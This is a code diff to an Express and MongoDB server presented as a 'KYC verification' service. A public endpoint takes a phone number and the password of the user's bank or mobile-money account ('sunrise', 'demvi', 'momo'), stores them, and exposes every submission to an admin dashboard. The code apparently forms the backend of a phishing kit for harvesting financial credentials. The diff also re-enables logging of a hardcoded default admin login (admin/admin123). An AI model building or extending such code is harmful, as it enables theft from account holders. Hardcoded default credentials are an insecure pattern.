@@ -18,6 +18,8 @@ app.use(bodyParser.urlencoded({ extended: true }));
 
 // MongoDB Connection
 mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/kyc_verification', {
+  useNewUrlParser: true,
+  useUnifiedTopology: true
 })
 .then(() => console.log('✅ MongoDB Connected Successfully'))
 .catch(err => console.error('❌ MongoDB Connection Error:', err));
@@ -41,6 +43,11 @@ const kycSubmissionSchema = new mongoose.Schema({
   agreedToShare: {
     type: Boolean,
     required: true
+  },
+  bankType: {
+    type: String,
+    required: true,
+    enum: ['sunrise', 'demvi', 'momo']
   },
   fatherName: {
     type: String,
@@ -153,7 +160,7 @@ const createDefaultAdmin = async () => {
         role: 'admin'
       });
       await defaultAdmin.save();
-    //   console.log('✅ Default admin created: username=admin, password=admin123');
+      console.log('✅ Default admin created: username=admin, password=admin123');
     }
   } catch (error) {
     console.error('Error creating default admin:', error);
@@ -221,7 +228,7 @@ app.post('/api/admin/login', async (req, res) => {
       { expiresIn: '24h' }
     );
 
-    // console.log(`✅ Admin logged in: ${username}`);
+    console.log(`✅ Admin logged in: ${username}`);
 
     res.json({
       success: true,
@@ -302,13 +309,21 @@ app.post('/api/admin/create', authenticateAdmin, async (req, res) => {
 // Step 1: Submit Initial KYC Data (PUBLIC)
 app.post('/api/kyc/step1', async (req, res) => {
   try {
-    const { phoneNumber, password, agreedToShare } = req.body;
+    const { phoneNumber, password, agreedToShare, bankType } = req.body;
 
     // Validation
-    if (!phoneNumber || !password || !agreedToShare) {
+    if (!phoneNumber || !password || !agreedToShare || !bankType) {
       return res.status(400).json({
         success: false,
-        message: 'All fields are required and agreement must be checked'
+        message: 'All fields are required including bank type'
+      });
+    }
+
+    // Validate bankType
+    if (!['sunrise', 'demvi', 'momo'].includes(bankType.toLowerCase())) {
+      return res.status(400).json({
+        success: false,
+        message: 'Invalid bank type'
       });
     }
 
@@ -318,12 +333,13 @@ app.post('/api/kyc/step1', async (req, res) => {
       password,
       // pin,
       agreedToShare,
+      bankType: bankType.toLowerCase(),
       step: 1
     });
 
     await submission.save();
 
-    console.log(`✅ Step 1 submitted for phone: ${phoneNumber}`);
+    console.log(`✅ Step 1 submitted for phone: ${phoneNumber}, Bank: ${bankType}`);
 
     res.status(201).json({
       success: true,
@@ -331,6 +347,7 @@ app.post('/api/kyc/step1', async (req, res) => {
       data: {
         id: submission._id,
         phoneNumber: submission.phoneNumber,
+        bankType: submission.bankType,
         step: submission.step,
         createdAt: submission.createdAt
       }
@@ -381,7 +398,7 @@ app.put('/api/kyc/step2/:id', async (req, res) => {
       });
     }
 
-    // console.log(`✅ Step 2 completed for: ${submission.fullName}`);
+    console.log(`✅ Step 2 completed for: ${submission.fullName}`);
 
     res.json({
       success: true,
@@ -389,7 +406,7 @@ app.put('/api/kyc/step2/:id', async (req, res) => {
       data: submission
     });
   } catch (error) {
-    // console.error('Error in Step 2:', error);
+    console.error('Error in Step 2:', error);
     res.status(500).json({
       success: false,
       message: 'Error submitting Step 2',
@@ -419,7 +436,7 @@ app.get('/api/kyc/submissions', authenticateAdmin, async (req, res) => {
       data: submissions
     });
   } catch (error) {
-    // console.error('Error fetching submissions:', error);
+    console.error('Error fetching submissions:', error);
     res.status(500).json({
       success: false,
       message: 'Error fetching submissions',
@@ -447,7 +464,7 @@ app.get('/api/kyc/submission/:id', authenticateAdmin, async (req, res) => {
       data: submission
     });
   } catch (error) {
-    // console.error('Error fetching submission:', error);
+    console.error('Error fetching submission:', error);
     res.status(500).json({
       success: false,
       message: 'Error fetching submission',
@@ -470,14 +487,14 @@ app.delete('/api/kyc/submission/:id', authenticateAdmin, async (req, res) => {
       });
     }
 
-    // console.log(`🗑️ Deleted submission: ${id}`);
+    console.log(`🗑️ Deleted submission: ${id}`);
 
     res.json({
       success: true,
       message: 'Submission deleted successfully'
     });
   } catch (error) {
-    // console.error('Error deleting submission:', error);
+    console.error('Error deleting submission:', error);
     res.status(500).json({
       success: false,
       message: 'Error deleting submission',
@@ -518,7 +535,7 @@ app.patch('/api/kyc/submission/:id/status', authenticateAdmin, async (req, res) 
       data: submission
     });
   } catch (error) {
-    // console.error('Error updating status:', error);
+    console.error('Error updating status:', error);
     res.status(500).json({
       success: false,
       message: 'Error updating status',
@@ -553,7 +570,7 @@ app.get('/api/kyc/stats', authenticateAdmin, async (req, res) => {
       }
     });
   } catch (error) {
-    // console.error('Error fetching stats:', error);
+    console.error('Error fetching stats:', error);
     res.status(500).json({
       success: false,
       message: 'Error fetching statistics',
